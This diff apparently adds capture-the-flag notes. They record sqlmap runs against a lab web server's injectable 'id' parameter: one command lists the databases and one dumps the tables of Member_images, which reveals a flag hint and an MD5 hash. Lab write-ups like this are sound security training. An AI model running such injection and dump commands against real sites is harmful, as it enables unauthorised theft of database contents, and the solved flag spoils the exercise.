@@ -1,0 +1,16 @@
+sqlmap 'http://10.0.2.5/index.php?page=member&id=ff&Submit=Submit#' --dbs 
+
+available databases [6]:
+[*] information_schema
+[*] Member_Brute_Force
+[*] Member_guestbook
+[*] Member_images
+[*] Member_Sql_Injection
+[*] Member_survey
+
+
+sqlmap 'http://10.0.2.5/index.php?page=member&id=ff&Submit=Submit#' --dump -D Member_images --tables 
+
+
+ | 5  | borntosec.ddns.net/images.png            | Hack me ? | If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46 |
+
